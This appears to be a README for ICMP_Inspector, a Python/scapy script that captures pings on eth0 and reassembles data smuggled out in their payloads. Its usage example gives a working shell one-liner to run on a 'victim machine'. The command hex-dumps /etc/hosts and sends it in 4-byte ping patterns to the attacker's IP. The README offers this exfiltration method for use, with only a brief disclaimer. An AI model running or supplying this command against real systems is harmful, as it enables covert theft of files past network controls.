# ICMP_Inspector

**ICMP_Inspector** is a lightweight Python script designed to capture and analyze incoming ICMP packets on the `eth0` interface designed specifically to extract hidden data sent via the ICMP protocol.

> [!NOTE]  
> **Have in mind that content can be exfiltrated from a machine via "sending pings" to other machines because icmp protocol tough ping can send up to 4bytes of data. This program specializes in retrieving this info and show it like it was in the host before the exfil.**

## Features
- Captures incoming ICMP packets in real-time.
- Filters packets specifically from the `eth0` interface.
- Parses the data to get the most accurate standart output from the machine.
- Lightweight and easy to use, suitable for quick testing or debugging.

## Requirements
- Python 3.x
- Libraries: `scapy`

## Installation
1. Clone this repository:
   ```bash
   git clone https://github.com/zer0plusone/ICMP_Inspector.git
   cd ICMPI_nspector
   ```
2. Install the required dependencies:
   ```bash
   pip install scapy
   ```

## Usage
Run the script with root privileges to capture packets:
```bash
sudo python3 ICMP_dataExfilter.py
```

### Example of usage

Lets say you tried to send the archive /etc/hosts from a linux machine to your own machine.

First of all you will have to execute the next comand in the victim machine:
```bash
xxd -p -c 4 /etc/hosts | while read line; do ping -c 1 -p $line $YOUR_IP; done
```

The ICMP protocol will send the data in packets of 4 bytes to your machine, you will have to have the script running in your terminal by the moment you press enter in the other command. The final result and what you will see in your terminal will be the full content of the archive as it should look in the victim machine.

## Disclaimer
1. Use this tool responsibly and only on networks where you have explicit permission.

2. Unauthorized packet inspection may violate laws or regulations in your jurisdiction.

3. THE DEVELOPER OF THIS PROGRAM ISN'T RESPONSIBLE FOR THE USE THIRD PARTY USERS GIVE TO THIS REPOSITORY.

## License
This project is licensed under the MIT License. See the `LICENSE` file for details.

## Contributions
Contributions are welcome! Fork the repository, make your changes, and submit a pull request for review.
